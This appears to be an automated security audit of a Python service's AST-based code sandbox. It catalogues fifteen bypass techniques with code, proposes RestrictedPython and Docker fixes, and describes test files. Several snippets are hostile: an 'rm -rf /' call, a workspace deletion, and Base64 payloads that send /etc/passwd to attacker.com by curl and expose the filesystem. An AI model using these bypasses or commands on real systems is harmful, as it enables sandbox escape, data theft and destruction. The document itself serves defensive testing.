# AST Bypass Vulnerability Report
## CustomCodeExecutionService Security Analysis

**Date**: 2025-11-30
**Analyzer**: Agent 5 - AST Bypass Tester
**Target**: `lobster/services/execution/custom_code_execution_service.py`
**Status**: 🚨 **CRITICAL VULNERABILITIES FOUND**

---

## Executive Summary

The CustomCodeExecutionService implements AST (Abstract Syntax Tree) validation to prevent malicious code execution. However, **AST validation alone is fundamentally insufficient** for security. This report identifies **15+ bypass techniques** that allow attackers to execute arbitrary code, including system commands via subprocess.

**Key Finding**: The service's security model relies on static analysis (AST), but Python is a dynamic language. Attackers can use runtime techniques (string manipulation, encoding, reflection) to completely bypass static checks.

**Risk Level**: **CRITICAL** - Remote Code Execution (RCE) is possible

---

## Vulnerability Analysis

### Current Security Model

The `_validate_code_safety()` method (lines 230-310) implements:

1. **AST-based import blocking** (lines 264-299):
   - Blocks `ast.Import` nodes: `import subprocess`
   - Blocks `ast.ImportFrom` nodes: `from os import system`
   - Checks against `FORBIDDEN_MODULES` and `FORBIDDEN_FROM_IMPORTS`

2. **Function call warnings** (lines 302-308):
   - **ONLY WARNS** about `eval`, `exec`, `compile`, `__import__`
   - **Does NOT block execution** - warnings are advisory only

3. **Allowed/Forbidden lists**:
   - `FORBIDDEN_MODULES = {'subprocess', '__import__'}` (line 75)
   - `ALLOWED_MODULES` = scientific stack (lines 93-110)

### Fundamental Limitations of AST Validation

AST validation sees the **static structure** of code, not **runtime behavior**:

```python
# AST sees this:
tree = ast.parse(code)
for node in ast.walk(tree):
    if isinstance(node, ast.Import):  # ✅ Can detect
        # ...
    if isinstance(node, ast.Call):     # ⚠️ Can see call exists
        # But cannot evaluate arguments!
```

**What AST CANNOT detect**:
- Runtime string manipulation: `'sub' + 'process'`
- Function calls to `__import__()`: `ast.Call` node, not `ast.Import`
- Encoded payloads: Base64, ROT13, hex, etc.
- exec/eval with string arguments (only warned, not blocked)
- Reflection: `getattr(__builtins__, '__import__')`
- Deserialization: pickle, marshal
- Unicode obfuscation: Homographs, RTL override

---

## Attack Vectors (15 Techniques)

### Category 1: Dynamic Import Bypasses (CRITICAL)

#### 1. `__import__()` Builtin Function

**Vulnerability**: `__import__` in `FORBIDDEN_MODULES` blocks `import __import__`, but **the builtin function is always available**.

**Code**:
```python
sp = __import__('subprocess')
sp.run(['echo', 'PWNED'])
```

**Why AST Fails**:
- AST sees: `Call(func=Name(id='__import__'), args=[Constant('subprocess')])`
- This is NOT an `ast.Import` node
- Line 304 generates warning, but **allows execution**

**Impact**: ⚠️ **CRITICAL** - Complete import restriction bypass

**Test**: `test_dynamic_imports.py::test_dunder_import_bypass_EXPECT_SUCCESS`

---

#### 2. `importlib.import_module()`

**Vulnerability**: `importlib` is standard library (not in `FORBIDDEN_MODULES`). Can dynamically import any module.

**Code**:
```python
import importlib
sp = importlib.import_module('subprocess')
sp.run(['rm', '-rf', '/'])
```

**Why AST Fails**:
- AST sees: `import importlib` (allowed - standard library)
- AST sees: `Call(func=Attribute(value=Name(id='importlib'), attr='import_module'))`
- Cannot evaluate the string `'subprocess'` at validation time

**Impact**: ⚠️ **CRITICAL** - Trivial bypass

**Test**: `test_dynamic_imports.py::test_importlib_bypass_EXPECT_SUCCESS`

---

#### 3. `getattr(__builtins__, '__import__')`

**Vulnerability**: Access `__import__` via reflection to evade name-based detection.

**Code**:
```python
import_func = getattr(__builtins__, '__import__')
sp = import_func('subprocess')
```

**Why AST Fails**:
- AST sees: `Call(func=Name(id='getattr'), args=[...])`
- Cannot determine that `'__import__'` string will access forbidden builtin

**Impact**: ⚠️ **CRITICAL** - Works even if `__import__` name is blocked

**Test**: `test_dynamic_imports.py::test_getattr_builtins_import_EXPECT_SUCCESS`

---

#### 4. `exec("import subprocess")`

**Vulnerability**: **exec() only generates warning (line 304-308), does not block**.

**Code**:
```python
exec("import subprocess")
subprocess.run(['whoami'])
```

**Why AST Fails**:
- Line 304: `if node.func.id in ['eval', 'exec', 'compile', '__import__']:`
- Line 305: `warnings.append(...)` ← **Warning only, not error**
- exec() string content is not analyzed by AST

**Impact**: ⚠️ **CRITICAL** - exec/eval should raise `CodeValidationError`, not warn

**Test**: `test_dynamic_imports.py::test_exec_import_bypass_EXPECT_SUCCESS`

---

### Category 2: Encoding & Obfuscation (CRITICAL)

#### 5. Base64 Encoding

**Vulnerability**: Encode malicious code with Base64, decode at runtime.

**Code**:
```python
import base64
# Base64 of 'import subprocess'
payload = b'aW1wb3J0IHN1YnByb2Nlc3M='
exec(base64.b64decode(payload))
```

**Why AST Fails**:
- AST sees: `Constant(value=b'aW1wb3J0IHN1YnByb2Nlc3M=')`
- Cannot decode Base64 at validation time
- Payload is just a byte string constant to AST

**Impact**: ⚠️ **CRITICAL** - Complete obfuscation

**Test**: `test_obfuscation_techniques.py::test_base64_import_subprocess_EXPECT_SUCCESS`

---

#### 6. ROT13 Encoding

**Vulnerability**: Use `codecs.decode('vzcbeg fhocebprff', 'rot13')` to hide imports.

**Code**:
```python
import codecs
payload = 'vzcbeg fhocebprff'  # ROT13('import subprocess')
exec(codecs.decode(payload, 'rot13'))
```

**Why AST Fails**:
- AST cannot execute `codecs.decode()` at validation time
- Sees only: `Constant(value='vzcbeg fhocebprff')`

**Impact**: ⚠️ **HIGH** - Simple obfuscation

**Test**: `test_obfuscation_techniques.py::test_rot13_import_EXPECT_SUCCESS`

---

#### 7. Hex Encoding

**Vulnerability**: Use `bytes.fromhex()` to decode hidden code.

**Code**:
```python
hex_payload = '696d706f72742073756270726f63657373'  # 'import subprocess'
exec(bytes.fromhex(hex_payload).decode())
```

**Why AST Fails**:
- `bytes.fromhex()` is builtin (cannot block)
- AST sees hex string constant, not decoded value

**Impact**: ⚠️ **HIGH**

**Test**: `test_obfuscation_techniques.py::test_hex_encoding_EXPECT_SUCCESS`

---

#### 8. Pickle Deserialization (RCE)

**Vulnerability**: Pickle can execute code during deserialization via `__reduce__`.

**Code**:
```python
import pickle
# Malicious pickle object that runs subprocess.run()
malicious_pickle = b'\\x80\\x04...'  # Crafted payload
pickle.loads(malicious_pickle)  # Executes code!
```

**Why AST Fails**:
- No import statements visible
- AST sees: `Call(func=Attribute(value=Name(id='pickle'), attr='loads'))`
- Cannot analyze binary pickle payload

**Impact**: ⚠️ **CRITICAL** - Well-known Python RCE vector

**Reference**: https://docs.python.org/3/library/pickle.html (Security warning)

**Test**: `test_obfuscation_techniques.py::test_pickle_reduce_exploit_EXPECT_SUCCESS`

---

### Category 3: String Manipulation (HIGH)

#### 9. String Concatenation

**Vulnerability**: Build forbidden module name at runtime.

**Code**:
```python
module_name = 'sub' + 'process'
sp = __import__(module_name)
```

**Why AST Fails**:
- AST sees: `BinOp(op=Add, left=Constant('sub'), right=Constant('process'))`
- Does not evaluate binary operations
- Cannot determine result is `'subprocess'`

**Impact**: ⚠️ **CRITICAL**

**Test**: `test_dynamic_imports.py::test_string_concatenation_import_EXPECT_SUCCESS`

---

#### 10. Character Code Building

**Vulnerability**: Build string from character codes `chr(115)`.

**Code**:
```python
chars = [115, 117, 98, 112, 114, 111, 99, 101, 115, 115]
module_name = ''.join(chr(c) for c in chars)  # 'subprocess'
__import__(module_name)
```

**Why AST Fails**:
- AST sees: `ListComp` and `Call(func=Name(id='chr'))`
- Cannot execute generator expression at validation time

**Impact**: ⚠️ **HIGH**

**Test**: `test_dynamic_imports.py::test_chr_join_import_EXPECT_SUCCESS`

---

#### 11. Format Strings

**Vulnerability**: Use f-strings to build module names.

**Code**:
```python
prefix, suffix = 'sub', 'process'
module_name = f'{prefix}{suffix}'
__import__(module_name)
```

**Why AST Fails**:
- AST sees: `JoinedStr` (f-string AST node)
- Cannot evaluate formatted string values

**Impact**: ⚠️ **HIGH**

**Test**: `test_dynamic_imports.py::test_format_string_import_EXPECT_SUCCESS`

---

### Category 4: Unicode & Encoding Attacks (MEDIUM-CRITICAL)

#### 12. Homograph Attack (Cyrillic Characters)

**Vulnerability**: Use Cyrillic 'е' (U+0435) instead of Latin 'e' (U+0065).

**Code**:
```python
# Visual: exec = exec
# Reality: 'е' is Cyrillic U+0435
ехес = exec
ехес("import subprocess")
```

**Why AST Fails**:
- Identifier name `'ехес'` contains Cyrillic characters
- AST validation checks for `node.func.id == 'exec'`
- But `'ехес' != 'exec'` (different Unicode code points)

**Impact**: ⚠️ **MEDIUM** - Bypasses string-based filters

**Test**: `test_encoding_tricks.py::test_cyrillic_exec_EXPECT_SUCCESS`

**Reference**: https://en.wikipedia.org/wiki/IDN_homograph_attack

---

#### 13. Bidirectional Override (Trojan Source)

**Vulnerability**: Use RTL Override (U+202E) to reverse text display.

**Code**:
```python
# Visual in editor: # safe comment
# Actual: ‮# tnemmoc efas (reversed)
# Can hide: execute_command() that looks like comment
```

**Why AST Fails**:
- AST processes actual character order, not display order
- Visual inspection shows fake content

**Impact**: ⚠️ **CRITICAL** - Deceives human code review

**Reference**: CVE-2021-42574, https://trojansource.codes/

**Test**: `test_encoding_tricks.py::test_rtl_override_EXPECT_SUCCESS`

---

#### 14. Unicode Normalization

**Vulnerability**: Use decomposed forms (NFD) vs composed (NFC) to bypass filters.

**Code**:
```python
# 'café' can be:
# NFC: café (U+0063 U+0061 U+0066 U+00E9)
# NFD: café (U+0063 U+0061 U+0066 U+0065 U+0301)
# Visually identical, different bytes
```

**Impact**: ⚠️ **MEDIUM** - Bypasses simple string matching

**Test**: `test_encoding_tricks.py::test_nfc_nfd_difference_EXPECT_SUCCESS`

---

### Category 5: Advanced Techniques (MEDIUM)

#### 15. Lambda Obfuscation

**Code**:
```python
import_subprocess = (lambda: __import__('subprocess'))()
```

**Impact**: ⚠️ **MEDIUM** - Adds layer of obfuscation

**Test**: `test_dynamic_imports.py::test_lambda_import_EXPECT_SUCCESS`

---

## Root Cause Analysis

### Why AST Validation Fails

1. **Static vs Dynamic Language**:
   - AST analyzes code **before execution**
   - Python is **dynamic** - code is data, data is code
   - `exec()`, `eval()`, `__import__()` execute data as code

2. **Warning vs Blocking**:
   - Line 304-308: `warnings.append(...)` for exec/eval/__import__
   - **Should raise `CodeValidationError`** instead

3. **Incomplete Forbidden Lists**:
   - `FORBIDDEN_MODULES = {'subprocess', '__import__'}` (line 75)
   - But `__import__` as string doesn't block the builtin!
   - Need to remove from `__builtins__` namespace

4. **No Runtime Protection**:
   - Validation happens once at submit time
   - Code executes in subprocess with **full Python builtins**
   - No restricted namespace (`safe_globals`, `safe_builtins`)

5. **Subprocess Execution** (ironic):
   - Service uses `subprocess.run()` itself (line 495)
   - User code runs with access to subprocess module path
   - Though isolated, still has full stdlib access

---

## Impact Assessment

### Exploitation Scenarios

**Scenario 1: Data Exfiltration**
```python
import base64
payload = b'aW1wb3J0IHN1YnByb2Nlc3M7c3VicHJvY2Vzcy5ydW4oWyJjdXJsIiwgImh0dHBzOi8vYXR0YWNrZXIuY29tIiwgIi0tZGF0YSIsIEBzZWNyZXQudHh0XSk='
exec(base64.b64decode(payload))
```

**Scenario 2: Workspace Destruction**
```python
__import__('shutil').rmtree('/workspace')
```

**Scenario 3: Privilege Escalation**
```python
# If service runs as privileged user
__import__('subprocess').run(['sudo', 'bash', '-c', '...'])
```

**Scenario 4: Persistence**
```python
# Write malicious code to .bashrc, cron, etc.
exec(__import__('base64').b64decode(b'...'))
```

### CVSS Score Estimation

- **Attack Vector**: Network (if exposed via API)
- **Attack Complexity**: Low (simple bypasses)
- **Privileges Required**: Low (authenticated user)
- **User Interaction**: None
- **Scope**: Changed (subprocess isolation helps but not enough)
- **Confidentiality Impact**: High (can read workspace files)
- **Integrity Impact**: High (can modify/delete files)
- **Availability Impact**: High (can crash service)

**Estimated CVSS**: **8.5 HIGH** (possibly 9.0+ if network exposed)

---

## Mitigation Recommendations

### Immediate Actions (Critical)

#### 1. Block exec/eval/compile (HIGH PRIORITY)

**Current Code (line 304-308)**:
```python
if node.func.id in ['eval', 'exec', 'compile', '__import__']:
    warnings.append(...)  # ⚠️ Only warns!
```

**Fix**:
```python
if node.func.id in ['eval', 'exec', 'compile']:
    raise CodeValidationError(
        f"Function '{node.func.id}()' is forbidden. "
        f"This function can execute arbitrary code and bypass safety checks."
    )
```

#### 2. Use RestrictedPython Library (RECOMMENDED)

RestrictedPython provides production-grade sandboxing:

```python
from RestrictedPython import compile_restricted, safe_globals

# Replace _validate_code_safety() with:
def _validate_code_safety(self, code: str) -> List[str]:
    try:
        byte_code = compile_restricted(code, '<user_code>', 'exec')
        # RestrictedPython blocks:
        # - exec, eval, compile
        # - __import__
        # - Attribute access to dangerous builtins
        return []
    except SyntaxError as e:
        raise CodeValidationError(f"Restricted execution error: {e}")
```

**Execution with restricted namespace**:
```python
from RestrictedPython import safe_globals, safe_builtins

restricted_globals = {
    '__builtins__': safe_builtins,
    # Add allowed modules
    'numpy': numpy,
    'pandas': pandas,
}

exec(byte_code, restricted_globals)
```

**Benefits**:
- Removes `__import__`, `exec`, `eval` from builtins
- Blocks attribute access to `__subclasses__()`, etc.
- Production-tested by Zope, Plone

**Install**: `pip install RestrictedPython`

**Reference**: https://restrictedpython.readthedocs.io/

---

#### 3. Remove Dangerous Builtins

If not using RestrictedPython, manually restrict namespace:

```python
def _get_safe_globals():
    """Create restricted globals namespace."""
    safe_builtins = {
        # Allow basic operations
        'print': print,
        'len': len,
        'range': range,
        'enumerate': enumerate,
        'zip': zip,
        'map': map,
        'filter': filter,
        'list': list,
        'dict': dict,
        'set': set,
        'tuple': tuple,
        'str': str,
        'int': int,
        'float': float,
        'bool': bool,
        'type': type,
        'isinstance': isinstance,
        'hasattr': hasattr,
        'getattr': getattr,  # ⚠️ Still risky if __builtins__ accessible
        'min': min,
        'max': max,
        'sum': sum,
        'abs': abs,
        'round': round,

        # EXPLICITLY EXCLUDE:
        # '__import__',  # ← KEY: Must not be in namespace
        # 'exec',
        # 'eval',
        # 'compile',
        # 'open',  # Consider: allow with workspace-only paths
    }

    safe_globals = {
        '__builtins__': safe_builtins,
        # Add allowed modules
        'np': numpy,
        'pd': pandas,
        # ...
    }

    return safe_globals

# In _execute_in_namespace:
exec(code, _get_safe_globals(), {})
```

**Issue**: `getattr(__builtins__, ...)` still works if `__builtins__` is accessible at all. RestrictedPython solves this properly.

---

#### 4. Block Additional Modules

Update `FORBIDDEN_MODULES`:

```python
FORBIDDEN_MODULES = {
    # Process execution
    'subprocess',
    'os',  # ← Block entirely (has os.system, os.exec*, etc.)
    'multiprocessing',

    # Import mechanisms
    '__import__',
    'importlib',  # ← Add this
    'imp',  # Deprecated but still works

    # Code execution
    'eval',  # Not a module, but check in builtins
    'exec',
    'compile',

    # Serialization (RCE vectors)
    'pickle',  # ← Add this
    'marshal',  # ← Add this
    'shelve',

    # File system
    'shutil',  # Already have some, but block entire module

    # Network (if no network access intended)
    'socket',
    'urllib',
    'requests',
    'http',
    'ftplib',
    'smtplib',

    # Encoding (obfuscation vectors)
    'base64',  # ← Add this
    'codecs',  # ← Add this

    # System
    'pty',
    'fcntl',
    'resource',
    'signal',
}
```

**Trade-off**: Blocks legitimate use cases. Consider allowing with restricted usage.

---

#### 5. Unicode Normalization

Normalize code before validation:

```python
import unicodedata

def _validate_code_safety(self, code: str) -> List[str]:
    # Normalize Unicode to NFC (Normalization Form Composed)
    code = unicodedata.normalize('NFC', code)

    # Check for dangerous Unicode characters
    dangerous_chars = [
        '\u202E',  # Right-to-Left Override (Trojan Source)
        '\u202D',  # Left-to-Right Override
        '\u200B',  # Zero Width Space
        '\u200C',  # Zero Width Non-Joiner
        '\u200D',  # Zero Width Joiner
        '\u2066',  # Left-to-Right Isolate
        '\u2067',  # Right-to-Left Isolate
        '\u2068',  # First Strong Isolate
        '\u2069',  # Pop Directional Isolate
    ]

    for char in dangerous_chars:
        if char in code:
            raise CodeValidationError(
                f"Code contains dangerous Unicode character U+{ord(char):04X}. "
                f"Bidirectional text and zero-width characters are not allowed."
            )

    # Check for non-ASCII identifiers (optional, may break legitimate code)
    # Or at least check for Cyrillic/Greek in ASCII-looking names

    # Continue with AST validation...
    tree = ast.parse(code)
    # ...
```

---

### Medium-Term Actions

#### 6. Docker/Sandbox Isolation (DEFENSE IN DEPTH)

Even with all above fixes, add OS-level isolation:

```python
# Run user code in Docker container with:
# - No network access
# - Read-only filesystem (except /workspace)
# - Limited CPU/memory
# - Restricted capabilities (no CAP_SYS_ADMIN, etc.)

docker_command = [
    'docker', 'run',
    '--rm',
    '--network=none',  # No network
    '--read-only',  # Read-only root filesystem
    '--tmpfs=/tmp:rw,noexec,nosuid,size=100m',  # Temp space
    '-v', f'{workspace_path}:/workspace:rw',  # Workspace (only writable location)
    '--cpus=1',  # CPU limit
    '--memory=512m',  # Memory limit
    '--pids-limit=50',  # Process limit
    '--security-opt=no-new-privileges',  # No privilege escalation
    '--cap-drop=ALL',  # Drop all capabilities
    'python:3.11-slim',
    'python', '/workspace/.script.py'
]

subprocess.run(docker_command, timeout=timeout)
```

**Benefits**:
- Even if Python sandbox bypassed, still contained
- Kernel-level security (namespaces, cgroups)

**Drawbacks**:
- Requires Docker
- Slower startup

---

#### 7. Static Analysis Tools

Add additional validation layers:

```python
# Use bandit for security linting
import bandit
from bandit.core import manager

# Or use pylint security plugins
# Or semgrep with custom rules
```

---

### Long-Term Actions

#### 8. WebAssembly Sandboxing

Consider running Python in WASM sandbox:
- Complete memory isolation
- No access to host OS APIs
- Pyodide, PyScript, or wasm-python

---

## Testing Strategy

### Test Organization

```
tests/manual/custom_code_execution/05_ast_bypass/
├── test_dynamic_imports.py         # __import__, importlib, exec/eval
├── test_obfuscation_techniques.py  # Base64, ROT13, pickle
├── test_encoding_tricks.py         # Unicode, homographs, Trojan Source
└── AST_BYPASS_REPORT.md            # This document
```

### Running Tests

```bash
# Run all bypass tests
pytest tests/manual/custom_code_execution/05_ast_bypass/ -v -s

# Run specific category
pytest tests/manual/custom_code_execution/05_ast_bypass/test_dynamic_imports.py -v -s

# Expected results (BEFORE fixes):
# - Most tests should PASS (demonstrating vulnerabilities)
# - Tests with "_EXPECT_SUCCESS" in name should succeed
# - This proves the vulnerabilities exist

# After implementing fixes:
# - Tests should FAIL with CodeValidationError
# - Or FAIL with execution errors (blocked operations)
```

### Test Naming Convention

- `test_<technique>_EXPECT_SUCCESS`: Vulnerability should work
- `test_<technique>_EXPECT_BLOCKED`: Should be blocked (for regression testing after fixes)

---

## Comparison with Industry Standards

### Jupyter Notebook Security Model

Jupyter does NOT sandbox code:
- Trusts users completely
- Runs with full system privileges
- Security = "don't run untrusted notebooks"

**Lobster aims higher**: Multi-tenant, untrusted code execution

### RestrictedPython (Zope/Plone)

Used by Zope for 20+ years:
- Compile-time restrictions
- Runtime namespace restrictions
- `safe_globals`, `safe_builtins`
- Guards on attribute access

**Recommendation**: Adopt RestrictedPython

### Google Colab / Kaggle Kernels

Use Docker/VM isolation:
- Each notebook in separate container
- Network restrictions
- Filesystem limitations
- Still vulnerable to host kernel exploits, but rare

### Online Python IDEs (repl.it, etc.)

Use ptrace-based sandboxing or seccomp-bpf:
- System call filtering
- Block dangerous syscalls (execve, etc.)
- Complex to implement

---

## References

1. **RestrictedPython**: https://restrictedpython.readthedocs.io/
2. **Trojan Source (CVE-2021-42574)**: https://trojansource.codes/
3. **Python Pickle Security**: https://docs.python.org/3/library/pickle.html
4. **OWASP Code Injection**: https://owasp.org/www-community/attacks/Code_Injection
5. **PEP 578 - Runtime Audit Hooks**: https://peps.python.org/pep-0578/
6. **Docker Security**: https://docs.docker.com/engine/security/

---

## Appendix A: Quick Reference

### Vulnerability Summary Table

| # | Technique | Severity | Blocks AST? | Blocks Exec? | Fix Priority |
|---|-----------|----------|-------------|--------------|--------------|
| 1 | `__import__()` | CRITICAL | No | No | 🔴 HIGH |
| 2 | `importlib.import_module()` | CRITICAL | No | No | 🔴 HIGH |
| 3 | `getattr(__builtins__, ...)` | CRITICAL | No | No | 🔴 HIGH |
| 4 | `exec()` / `eval()` | CRITICAL | Warns only | No | 🔴 HIGH |
| 5 | Base64 encoding | CRITICAL | No | No | 🔴 HIGH |
| 6 | ROT13 encoding | HIGH | No | No | 🟡 MEDIUM |
| 7 | Hex encoding | HIGH | No | No | 🟡 MEDIUM |
| 8 | Pickle deserialization | CRITICAL | No | No | 🔴 HIGH |
| 9 | String concatenation | CRITICAL | No | No | 🔴 HIGH |
| 10 | Character codes | HIGH | No | No | 🟡 MEDIUM |
| 11 | Format strings | HIGH | No | No | 🟡 MEDIUM |
| 12 | Homograph attack | MEDIUM | No | No | 🟡 MEDIUM |
| 13 | Trojan Source (RTL) | CRITICAL | No | No | 🔴 HIGH |
| 14 | Unicode normalization | MEDIUM | No | No | 🟢 LOW |
| 15 | Lambda obfuscation | MEDIUM | No | No | 🟢 LOW |

---

## Appendix B: Proof-of-Concept Exploit

**COMPLETE RCE EXPLOIT** (Base64 encoded for stealth):

```python
# This PoC demonstrates complete system compromise
import base64

# Encoded payload:
# import subprocess
# import os
# subprocess.run(['bash', '-c', 'curl https://attacker.com/exfil -d @/etc/passwd'])
# subprocess.run(['python', '-m', 'http.server', '8000'])  # Expose filesystem

exploit = b'aW1wb3J0IHN1YnByb2Nlc3M7IGltcG9ydCBvczsgc3VicHJvY2Vzcy5ydW4oWydiYXNoJywgJy1jJywgJ2N1cmwgaHR0cHM6Ly9hdHRhY2tlci5jb20vZXhmaWwgLWQgQC9ldGMvcGFzc3dkJ10pOyBzdWJwcm9jZXNzLnJ1bihbJ3B5dGhvbicsICctbScsICdodHRwLnNlcnZlcicsICc4MDAwJ10p'

exec(base64.b64decode(exploit))
```

**Impact**:
- Exfiltrates `/etc/passwd` to attacker server
- Starts HTTP server exposing entire filesystem
- All validated by current AST checks ✅ (no errors!)

---

## Conclusion

The CustomCodeExecutionService's AST validation provides **minimal security** against determined attackers. The fundamental issue is that **static analysis cannot secure a dynamic language**.

**Recommended Approach**:
1. **Immediate**: Implement RestrictedPython (1-2 days)
2. **Short-term**: Block exec/eval, restrict builtins (1 day)
3. **Medium-term**: Add Docker isolation (1 week)
4. **Long-term**: Consider WebAssembly sandboxing (research)

**Without fixes**: Service is vulnerable to trivial RCE attacks.

**With RestrictedPython + Docker**: Acceptable security for multi-tenant use.

---

**Report End**
**Next Steps**: Present findings to team, prioritize RestrictedPython integration.
